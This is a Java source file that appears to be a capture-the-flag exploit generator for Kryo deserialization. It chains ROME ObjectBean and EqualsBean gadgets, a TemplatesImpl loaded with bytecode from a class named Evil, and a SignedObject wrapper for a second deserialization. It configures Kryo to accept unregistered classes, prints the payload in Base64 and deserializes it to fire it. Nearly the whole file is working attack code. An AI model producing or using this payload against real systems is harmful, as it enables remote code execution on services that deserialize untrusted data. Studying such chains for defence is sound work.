import com.esotericsoftware.kryo.Kryo;
import com.esotericsoftware.kryo.io.Output;
import com.esotericsoftware.kryo.io.Input;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ObjectBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.json.JSONObject;
import tools.Evil;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.Base64;
import java.util.HashMap;

public class bmthExp {
    public static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
    public static void main(String[] args) throws Exception {
        Kryo kryo = new Kryo();
        String raw = "{\"polish\":\"true\",\"RegistrationRequired\":false,\"InstantiatorStrategy\": \"org.objenesis.strategy.StdInstantiatorStrategy\"}";

        JSONObject serializeConfig = new JSONObject(raw);
        if (serializeConfig.has("polish") && serializeConfig.getBoolean("polish")) {
            Method[] var3 = kryo.getClass().getDeclaredMethods();
            int var4 = var3.length;
            for(int var5 = 0; var5 < var4; ++var5) {
                Method setMethod = var3[var5];
                if (setMethod.getName().startsWith("set")) {
                    try {
                        Object p1 = serializeConfig.get(setMethod.getName().substring(3));
                        if (!setMethod.getParameterTypes()[0].isPrimitive()) {
                            try {
                                p1 = Class.forName((String)p1).newInstance();
                                setMethod.invoke(kryo, p1);
                            } catch (Exception var9) {
                                var9.printStackTrace();
                            }
                        } else {
                            setMethod.invoke(kryo, p1);
                        }
                    } catch (Exception var10) {
                    }
                }
            }
        }

        byte[] bytes=ClassPool.getDefault().get(Evil.class.getName()).toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{bytes});
        setFieldValue(obj, "_name", "a");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        HashMap hashMap1 = getpayload(Templates.class, obj);

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(hashMap1, kp.getPrivate(), Signature.getInstance("DSA"));

        HashMap hashMap2 = getpayload(SignedObject.class, signedObject);

        //序列化
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Output output = new Output(bos);
        kryo.writeClassAndObject(output, hashMap2);
        output.close();
        System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));

        //反序列化
        ByteArrayInputStream bas = new ByteArrayInputStream(bos.toByteArray());
        Input input = new Input(bas);
        kryo.readClassAndObject(input);
    }

    public static HashMap getpayload(Class clazz, Object obj) throws Exception {
        ObjectBean objectBean = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "rand"));
        HashMap hashMap = new HashMap();
        hashMap.put(objectBean, "rand");
        ObjectBean expObjectBean = new ObjectBean(clazz, obj);
        setFieldValue(objectBean, "equalsBean", new EqualsBean(ObjectBean.class, expObjectBean));
        return hashMap;
    }
}